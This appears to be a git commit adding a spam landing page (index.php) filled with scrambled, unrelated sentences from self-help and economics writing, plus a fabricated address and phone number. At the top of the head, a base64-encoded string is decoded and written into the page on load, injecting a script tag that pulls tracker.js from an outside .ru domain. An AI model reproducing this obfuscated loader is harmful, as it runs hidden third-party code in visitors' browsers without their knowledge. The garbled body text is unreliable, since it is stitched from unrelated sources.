834494f1d21a22504bd160cad6971384262beae5
tvjcmcbt <81511181+tvjcmcbt@users.noreply.github.com>
2021-03-28 13:01:11 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl84eXd1MXN0czJhMTByczkzaXgiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>- What do you mean "old woman"! This woman is no more than 20-22 years old! - Come on, </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="i3hwb7cogm8bqn35fl22a">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="5umc8c5ug3izvjeenrzp9x">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>- What do you mean "old woman"! This woman is no more than 20-22 years old! - Come on, </h1>
+	</section>
+
+
+	<section class="our-work" class="ta9s6t0ltgrw2i5wx1ua9">
+		<h3 class="title">CHANGES IN SUPPLY Changes in supply are influenced </h3>
+		<p>At noon, he unrolled the second sheet of paper and read: "Try to go back." "Where is it," back? " He wondered.  The next day, in the middle of class, I found that I was missing the colored markers I needed.  Elasticity Properties Elasticity varies depending on the selected price range.  By looking closely, you can see behind a person's behavior what is at the center of his life, what forms this behavior.  As soon as they realized that there was very little time left to live, the futility of abuse, evil thoughts, insults and accusations became obvious to them.  When they presented the developed contract, the president of our company said: "Now, let's make sure that we understand correctly what you need."And he began to outline the content of the contract point by point - in his own words and "reflecting" the feelings of his partners. </p>
+		<hr>
+
+		<ul class="grid" class="pm2f8cwdrthucqvve">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="ta9s6t0ltgrw2i5wx1ua9">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>There are three time intervals: 1) the shortest market period.  Thus, if you are 40 years old, you should aim for loads that increase y</td>
+    <td>X and 20 units.  Working in a fashion store, you would hire her as a fashion model.  It could all end well.  Together we cult</td>
+    <td>Therefore, you have to take the risk "upon yourself".  " One afternoon I was sitting at home in my office writing, in particular, on the topic</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>Expectations of future changes in the price of a product may also affect a manufacturer's willingness to market a product at the present time.  It is d</td>
+    <td>The marginal rate of substitution (MRSxy) of product X for product Y is equal to: MRSхy = -? Y /? X where? Y - change in consumption of goods Y; ? X</td>
+    <td>Nobody controlled him.  Before that, our approach was different: "outside-in".We loved each other and tried to overcome difficulties </td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>Without considering how we see ourselves (and others), we will not be able to understand how others see and perceive them</td>
+    <td>8.  Or else I should find some kind of motivating training program that gets them to work harder.  It defines the rights and forms o</td>
+    <td>- And we have three children; we are concerned about their fate.  Make a commitment to start planning on a weekly basis and set a consistent time for this activity</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="i3hwb7cogm8bqn35fl22a">
+		<h3 class="title">As the scale of production changes, so doe</h3>
+		<p>The more efficient you are in managing your life (Habit 3), the more renewing actions from Square II you can take (Habit 7).  People who are absent from the workplace due to illness or vacation are not considered unemployed.  See, for example, how a house is built.  Money, providing its owner with the receipt of any commodity, becomes the universal embodiment of social wealth.  Your ability to act extends far beyond your own resources, which contributes to a high level of interdependence.Your current financial condition and other momentary circumstances are not decisive for your decisions and actions.  Ezra Taft Benson I want to share with you an episode from my life, which, in my opinion, expresses the essence of this book.  And they will open up if they feel that their parents will love them with unconditional love and after these confessions they will not condemn them and will not laugh at them.  Change in average costs in the long run Long-term average costs and scale of production.  By exchanging remarks, we try to present the situation as real as possible.  Whenever we think that the problem is “out there,” that very thought is the problem. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="5umc8c5ug3izvjeenrzp9x" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ta9s6t0ltgrw2i5wx1ua9">
+		<h3 class="title">It will make you truly independent and able to be effectively i</h3>
+		<p>Otherwise, buyers - legal entities will prefer to buy the same product from a company that is a VAT payer.  - Well done! Using these two words, I taught my son how to take care of the yard for two weeks until I felt that he was ready to take on the job.The long-awaited day has come.  Various enterprises are located on the ground.The land is a source of minerals and natural resources.  Investments associated with the militarization of the economy are especially dangerous for inflation.  This is the document that the President of the country swears to protect and support,swearing allegiance to the fatherland.  It is almost impossible to say no to the “popular” Quarter III affairs or the pleasant escape to Quadrant IV unless you have a big flaming yes inside.  This is true of the individual,in relation to marriage and family and in relation to organization.  The intelligence quotient of "strong" students has dropped significantly.  They began to listen to them, teach and advise them.  There are times when neither the teacher nor the students know for sure what exactly is going to happen.It all starts in a calm atmosphere that disposes people to openness and the desire to recognize and listen to each other's views.  Maintain order in your personal life and at work. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="pm2f8cwdrthucqvve" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="pm2f8cwdrthucqvve" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="i3hwb7cogm8bqn35fl22a">
+		<h3 class="title">In line with these priorities, they decided to devo</h3>
+		<p>She told the children that she would like to reach such an agreement with them so that everyone would be happy, otherwise they would just find another way to reveal their talents together.  - What do you mean: “I don’t want to study”? And this is after everything we sacrificed for your education!Education is the foundation of your future! If you try the same as your older sister, you will do better and enjoy learning.  They behaved proactively and acted in their Circle of Influence.  There is no other way to use this hour that can be compared in value and results to Daily Personal Victory.  It is possible as long as prices for all firms are not equal in terms of average costs.  When these tendencies to return to old scenarios are manifested against the backdrop of emotional dependence in marriage, the vulnerability of a relationship that puts the spouse at the center becomes apparent.  As a result, managers have compiled a list of over a hundred goals.  They simply do not accept such decisions.  The essence of "logotherapy" - the philosophy he later developed and taught - is that many of the so-called mental and nervous diseases are in fact symptoms of a subconscious sense of meaninglessness and emptiness.  Irrecoverable costs are incurred by the firm once and for all and cannot be reimbursed even if the firm completely ceases to operate in this area.If a firm plans to start working in some new direction of business for itself or expand its operations, then the sunk costs associated with this decision are precisely the opportunity costs associated with starting a new activity.  It starts with the transformation of the original data (introduction to the computer, checking for errors, coding, representation in matrix form).  You listen to a person's behavior.  If we do not practice Habit 2, we do not have a clear idea of ​​what is important, about the results that we want to achieve in life, then we easily move on to respond to the urgent.Take a look at the squares of the time management matrix.  There is no longer a difference between what he thinks and feels, and what he tells you. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="5umc8c5ug3izvjeenrzp9x" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ta9s6t0ltgrw2i5wx1ua9">
+		<h3 class="title">Although people may argue about how these </h3>
+		<p>* * * The family of a friend of mine has been fond of singing in chorus for several years.  The lifestyle of thosewho spends time almost exclusively in Squares III and IV may be called irresponsible.  Your goals will be in harmony with correct principles and natural laws,which will give you more strength to achieve them.  The friend himself had no interest in this game.  Almost all of our clients, after the first acquaintance with these materials, tried to make them available to as many of their employees as possible, strengthening our confidence that the idea behind them really works.  The monopolist has two options: 1) using the deficit to keep the price high;2) increased sales at discounted prices.  74.  The use of taxes is one of the economic methods of management and ensuring the relationship of national interests with the commercial interests of entrepreneurs.  Sometimes the seller does not need any product at all, as he just wants to save money.And since antiquity, the most popular goods began to stand out, which would play the role of value, allowing you to measure the value of the rest.  Having opened up to mutual influence, people began to make one discovery after another and develop more and more new solutions.  Your planning tool should be your servant, not your master. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="pm2f8cwdrthucqvve" class="title">First-generation notebooks and to-do lists give us the opportun</h3>	
+		<p>- I don't want gum! She screamed.  The strong like the weakness of others, because it allows them to achieve an advantage.  The negative form of cross elasticity is inherent in complementary goods.  This man did look miserable.  At the same time, it is the force of gravity that holds our world, it keeps the planets in their orbits and maintains order in the Universe.This power is powerful, and when properly applied, we can harness the gravity of our habits to create the unity and order needed to be effective in our lives.  Are you satisfied with this reflection of your life? 3.  As you increase your body's ability to handle more and more stress, you will find that doing normal work becomes more and more enjoyable for you.  I've attended seminars on time management and tried half a dozen scheduling systems.  How can this be: listen for three hours! But because he had promised the doctor that he would follow his instructions, he listened.  The next time you have a disagreement or argument with another person, try to understand the interests underlying that position.  As proactive people, we can begin to articulate who we want to be and what we want to do in our life. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="i3hwb7cogm8bqn35fl22a">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="5umc8c5ug3izvjeenrzp9x"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ta9s6t0ltgrw2i5wx1ua9"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="pm2f8cwdrthucqvve"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>7552 Rosendo Light, Suite 723, 67568, Lake Judsonbury, Mississippi, United States</p>
+		<p>Phone number: +78(1941)227-2782300</p>
+	</footer>
+
+</body>
+
+</html>
